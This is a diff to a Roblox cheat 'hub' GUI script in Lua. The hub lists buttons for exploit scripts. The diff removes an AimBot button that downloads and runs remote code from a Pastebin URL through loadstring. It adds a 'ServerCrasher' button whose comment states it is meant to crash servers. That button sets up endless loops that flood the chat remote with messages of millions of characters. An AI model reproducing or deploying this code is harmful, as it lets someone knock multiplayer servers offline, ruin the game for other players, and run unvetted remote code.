@@ -52,7 +52,7 @@ local PotatoHub = Instance.new("TextButton")
 local _3 = Instance.new("ImageLabel")
 local InfiniteYield = Instance.new("TextButton")
 local _5 = Instance.new("ImageLabel")
-local AimBot = Instance.new("TextButton")
+local Crasher = Instance.new("TextButton")
 local _6 = Instance.new("ImageLabel")
 local FathomHub = Instance.new("TextButton")
 local _7 = Instance.new("ImageLabel")
@@ -309,19 +309,31 @@ _5.ScaleType = Enum.ScaleType.Slice
 _5.SliceCenter = Rect.new(100, 100, 100, 100)
 _5.SliceScale = 0.120
 
-AimBot.Name = "AimBot"
-AimBot.Parent = _5
-AimBot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-AimBot.BackgroundTransparency = 1.000
-AimBot.Size = UDim2.new(0, 103, 0, 30)
-AimBot.Font = Enum.Font.SourceSans
-AimBot.Text = "AimBot"
-AimBot.TextColor3 = Color3.fromRGB(255, 255, 255)
-AimBot.TextScaled = true
-AimBot.TextSize = 14.000
-AimBot.TextWrapped = true
-AimBot.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/2Q5ZcMJZ",true))()
+Crasher.Name = "ServerCrasher"
+Crasher.Parent = _5
+Crasher.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Crasher.BackgroundTransparency = 1.000
+Crasher.Size = UDim2.new(0, 103, 0, 30)
+Crasher.Font = Enum.Font.SourceSans
+Crasher.Text = "ServerCrasher"
+Crasher.TextColor3 = Color3.fromRGB(255, 255, 255)
+Crasher.TextScaled = true
+Crasher.TextSize = 14.000
+Crasher.TextWrapped = true
+Crasher.MouseButton1Click:Connect(function()
+	--script edited by settings#2006 to CRASH servers.
+	while true do                
+	wait()
+	while true do            
+	wait()
+	for i=1, 100 do
+	local msg = "/e "..string.rep("do the same with this put whatever you want.   ",301056)
+	game:GetService("RunService").RenderStepped:Connect(function()
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
+	end)
+	end
+	end
+	end
 end)
 
 _6.Name = "6"
